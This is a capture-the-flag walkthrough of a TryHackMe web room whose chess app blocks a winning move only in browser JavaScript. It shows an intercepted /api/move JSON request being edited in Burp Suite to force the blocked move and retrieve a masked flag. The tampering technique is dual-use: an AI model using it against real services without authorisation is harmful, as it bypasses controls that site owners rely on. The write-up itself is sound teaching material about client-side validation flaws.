Fool's Mate — Room Walkthrough

Fool's Mate is an easy web exploitation TryHackMe challenge centered around a chess endgame puzzle called EndgameTrainer. Although the board is set up for an immediate one-move checkmate, client-side JavaScript blocks the winning move. Compromising the challenge demonstrates why security controls must never rely solely on client-side validation and how intercepting API traffic with Burp Suite bypasses front-end restrictions.

01. Reconnaissance & Client-Side Behavior

Navigating to the target web application at http://10.114.150.133/ presented an interactive chess board titled "EndgameTrainer" with the status set to Mate-in-one · White to move.

Looking at the board state, White has a Rook on a1, pawns on f2, g2, and h2, and a King on g1, while Black's King is trapped on g8 behind pawns on f7, g7, and h7. Moving the White Rook straight up the file from a1 to a8 delivers an instant back-rank checkmate.

However, attempting to play a1 to a8 in the browser triggered a popup warning instead of executing the move:

I'll shut down your PC if you play that.

Attempting to play any of the three pawns instead could not deliver checkmate in a single move as required by the challenge. Inspecting the page elements did not immediately expose a bypass, indicating that the restriction was being enforced in the browser before any move was transmitted to the backend.

02. Traffic Interception & API Analysis

To observe how valid moves communicate with the server, I opened Burp Suite, enabled Proxy Intercept, and tested moving the Rook from a1 to a8 again. No HTTP request appeared in Burp Suite, confirming that the client-side script blocked the winning move locally before sending anything over the network.

Next, I moved an unrestricted piece—pushing the pawn from f2 to f4. Burp Suite immediately intercepted a JSON POST request to /api/move:

POST /api/move HTTP/1.1
Host: 10.114.150.133
Content-Length: 23
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.114.150.133
Referer: http://10.114.150.133/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
    "from":"f2",
    "to":"f4"
}

The API accepts a simple JSON object containing from and to board coordinates without any cryptographic signature or integrity check.

03. Exploitation & Flag Retrieval

With the POST /api/move request paused in Burp Suite Proxy, I modified the JSON payload directly in the request body from the pawn move to the blocked Rook checkmate move:

{
    "from":"a1",
    "to":"a8"
}

After forwarding the tampered request to the server, the backend validated the chess move as legal and returned a 200 OK JSON response containing the updated board state, checkmate status, and the flag:

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{
  "ok": true,
  "move": "a1a8",
  "fen": "R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1",
  "status": "checkmate",
  "turn": "b",
  "winner": "white",
  "flag": "THM{cl******************3}"
}

Simultaneously, the web interface updated to display Checkmate — White wins along with the flag banner:

THM{cl******************3}
